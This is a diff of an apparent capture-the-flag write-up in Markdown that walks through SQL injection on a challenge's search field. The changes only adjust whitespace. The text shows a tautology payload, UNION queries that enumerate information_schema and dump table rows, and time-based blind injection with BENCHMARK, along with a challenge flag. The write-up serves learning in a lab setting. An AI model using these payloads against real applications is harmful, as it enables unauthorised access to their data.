@@ -24,7 +24,7 @@ aliases = [
 ]
 +++
 
-- Points: 700
+-   Points: 700
 
 ## Description
 
@@ -44,13 +44,13 @@ This time, no error message is shown. But the output is! (I'll get back to that 
 SELECT why FROM naughty WHERE why LIKE '%search text%';
 ```
 
-If this were the query, we can easily try to just get all records. To do this, we need to modify the `WHERE` statement to always be true. A way to do this is to add a `OR 1=1 -- ` to the query as `1` is always equal to `1`. But how do we do that? Well, is the backend doesn't properly create a query, we can escape the string inside the `WHERE` query and add our own code. An example input would be `' OR 1=1 -- `. If this would be inserted inside the query we would get this:
+If this were the query, we can easily try to just get all records. To do this, we need to modify the `WHERE` statement to always be true. A way to do this is to add a `OR 1=1 --` to the query as `1` is always equal to `1`. But how do we do that? Well, is the backend doesn't properly create a query, we can escape the string inside the `WHERE` query and add our own code. An example input would be `' OR 1=1 --`. If this would be inserted inside the query we would get this:
 
 ```sql
 SELECT why FROM naughty WHERE why LIKE '%' OR 1=1 -- %';
 ```
 
-If we input this (`' OR 1=1 -- `) in the search field, we get the flag! It is `NOVI{bl1nd_sql1_is_naughty}`
+If we input this (`' OR 1=1 --`) in the search field, we get the flag! It is `NOVI{bl1nd_sql1_is_naughty}`
 
 This flag can then be submitted for the [challenge](https://ctfd.adventofctf.com/challenges#7-8).
 
@@ -102,7 +102,7 @@ Now that we know the table name, we can then get the columns from it with this q
 SELECT column_name FROM information_schema.columns WHERE table_name = "naughty"
 ```
 
-If we convert this to an input, we get `' UNION SELECT column_name FROM information_schema.columns WHERE table_name = "naughty" -- `. This return the following rows:
+If we convert this to an input, we get `' UNION SELECT column_name FROM information_schema.columns WHERE table_name = "naughty" --`. This return the following rows:
 
 | Who?     |
 | -------- |
@@ -118,7 +118,7 @@ Knowing the table and column names, we can get all rows in the table. This outpu
 SELECT CONCAT(id, " | ", username, " | ", badthing) FROM naughty
 ```
 
-Converted to an input we get `' UNION SELECT CONCAT(id, " | ", username, " | ", badthing) FROM naughty -- `, which, after submitting it, gives us one row:
+Converted to an input we get `' UNION SELECT CONCAT(id, " | ", username, " | ", badthing) FROM naughty --`, which, after submitting it, gives us one row:
 
 | Who?                                        |
 | ------------------------------------------- |
@@ -148,7 +148,7 @@ SELECT CASE WHEN (SELECT DATABASE() LIKE "a%") THEN BENCHMARK(9000000,MD5(1)) EL
 
 This would run `BENCHMARK(9000000,MD5(1))` if the sub-query returns more than 1 row. The `BENCHMARK()` is used because it's a function that takes a while to run.
 
-This query will have to be converted to an input first. This will become `' UNION SELECT CASE WHEN (SELECT DATABASE() LIKE "a%") THEN BENCHMARK(9000000,MD5(1)) ELSE 1 END -- `
+This query will have to be converted to an input first. This will become `' UNION SELECT CASE WHEN (SELECT DATABASE() LIKE "a%") THEN BENCHMARK(9000000,MD5(1)) ELSE 1 END --`
 
 If we replace `a` with another letter we can find out the database name like this:
 
@@ -177,6 +177,6 @@ To get the tables inside the database, the same method will have to be used. An 
 SELECT CASE WHEN COUNT((SELECT table_name FROM information_schema.tables WHERE table_name LIKE "a%" AND table_schema = "testdb" LIMIT 1))>0 THEN BENCHMARK(9000000,MD5(1)) ELSE 1 END
 ```
 
-Which will convert to `' UNION SELECT CASE WHEN COUNT((SELECT table_name FROM information_schema.tables WHERE table_name LIKE "a%" AND table_schema = "testdb" LIMIT 1))>0 THEN BENCHMARK(9000000,MD5(1)) ELSE 1 END -- `
+Which will convert to `' UNION SELECT CASE WHEN COUNT((SELECT table_name FROM information_schema.tables WHERE table_name LIKE "a%" AND table_schema = "testdb" LIMIT 1))>0 THEN BENCHMARK(9000000,MD5(1)) ELSE 1 END --`
 
 By using this method, we can get the all database records but it will take a long time.
